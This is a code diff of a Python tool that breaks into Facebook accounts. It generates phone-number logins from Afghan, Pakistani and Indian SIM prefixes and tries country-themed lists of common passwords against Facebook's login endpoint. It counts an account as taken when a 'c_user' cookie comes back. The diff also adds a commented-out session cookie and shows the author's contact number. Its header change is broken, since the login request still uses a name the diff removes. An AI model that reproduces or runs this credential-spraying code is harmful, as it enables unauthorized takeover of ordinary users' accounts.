@@ -209,14 +209,14 @@ else:
     tag = "AM"
     
 logo ="""  \033[1;32;40m
-MMS MMS MMS
-MMS MMS MMS
+KHOSTI MAFIA
+AFGHANSTAN MAFIA
  \033[1;37m══════════════════════════════════════════════════
 \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mMafia Rayess
 \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mMafia Rayess
 \033[1;32mWHATSAPP   \033[1;31m ➟   \033[1;32m+93783361438
 \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁  \033[1;31m ➟   \033[1;32mcrimanl313
-\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.1  
+\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m3.1  
 \033[1;32m𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m ➟   \033[1;32m𝐅𝐑𝐄𝐄
 \033[1;37m MAFIA TURMEX COMMANDS
 \033[1;37m══════════════════════════════════════════════════"""
@@ -301,8 +301,8 @@ def passx():
     print('              \x1b[97m\033[37;41m[ PASSWORD MENU ]\033[0;m ')
     print('\033[1;97m====================================================') 
     print("\033[1;97m[01] \033[1;92mAFGHAN AUTO PASS         \033[1;96m[FASTEST]")
-    print("\033[1;97m[02] \033[1;92mAUTO PASS 7 AND 11 DIGITS  \033[1;96m[FAST]")
-    print("\033[1;97m[03] \033[1;92mAUTO PASS 7 DIGIT AND KHAN \033[1;96m[FAST]")
+    print("\033[1;97m[02] \033[1;92mAUTO PAKISTAN PASS  \033[1;96m[FAST]")
+    print("\033[1;97m[03] \033[1;92mINDIA AUTO PASS \033[1;96m[FAST]")
     print("\033[1;97m[04] \033[1;92mONLY KHAN PASS             \033[1;96m[SLOWEST]")
     print("\033[1;97m[05] \033[1;92mKHAN & ALI MIX PASS        \033[1;96m[SLOWEST]")
     print("\033[1;97m[06] \033[1;92mKHAN & MALIK MIX PASS      \033[1;96m[SLOWEST]")
@@ -365,7 +365,7 @@ def pass1():
         print('\033[1;97m====================================================') 
         for love in user:
             uid = code+love
-            pwx = [love,]
+            pwx = ['500500','600700','malik123','100200','10002000','khankhan','50005000','786786','afghan1234','afghanistan','Kabul1122','Kabul123','Afghanistan','AFGHAN123']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
@@ -415,7 +415,7 @@ def pass2():
         print('\033[1;97m====================================================') 
         for love in user:
             uid = code+love
-            pwx = [love,uid]
+            pwx = ['malik12345','first123','first@12345','firstlast@1122','firstlast12345','khankhan','lastlast','786786','multan12345','City12345','pak123','first321','first1234','Pakistan']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
@@ -436,7 +436,7 @@ def pass3():
     print('\033[1;97m====================================================') 
     
     print('\033[1;97m====================================================') 
-    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR AFG [070 / 077 / 079 / 078 /070]\033[0;m")
     print('\033[1;97m====================================================') 
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
@@ -463,7 +463,7 @@ def pass3():
         print('\033[1;97m====================================================') 
         for love in user:
             uid = code+love
-            pwx = [love,'khankhan']
+            pwx = ['57273200','59039200','57575751','hindustan','inida12345','india123','Indiana','pubgpubg','Indian','102030','50006000','700800','first1234','firstlast123']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
@@ -486,7 +486,7 @@ def pass4():
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
     print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
     print('\033[1;97m====================================================') 
-    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR AFG [070 / 077 / 079 / 078 /070]\033[0;m")
     print('\033[1;97m====================================================') 
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
@@ -513,7 +513,7 @@ def pass4():
         print('\033[1;97m====================================================') 
         for love in user:
             uid = code+love
-            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
+            pwx = ['khankhan','khan khan','khan123','khan12','khan1122']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
@@ -645,23 +645,30 @@ def freeq(uid,pwx,tl):
             "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'www.facebook.com',
-            'method': 'GET',
-            'path':'https://www.facebook.com/?_rdc=1&_rdr',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'referer':'https://www.facebook.com/',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            headers = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; m_pixel_ratio=3.43505597114563; x-referer=eyJyIjoiL2hvbWUucGhwIiwiaCI6Ii9ob21lLnBocCIsInMiOiJtIn0%3D; locale=fa_IR; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; wd=315x578',
+    'dpr': '2.75',
+    'referer': 'https://m.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Mi Note 10 Lite"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'service-worker-navigation-preload': '{"k":"rev,1012602634;locale,fa_IR;cohort,BP:DEFAULT;branch,trunk;dpr,3;features,;u,100092845052717;","a":"1712483496","t":31536000,"n":"tVXQFKce","v":"2458","p":4,"r":1012602634,"o":"h2","y":"wblt"}',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
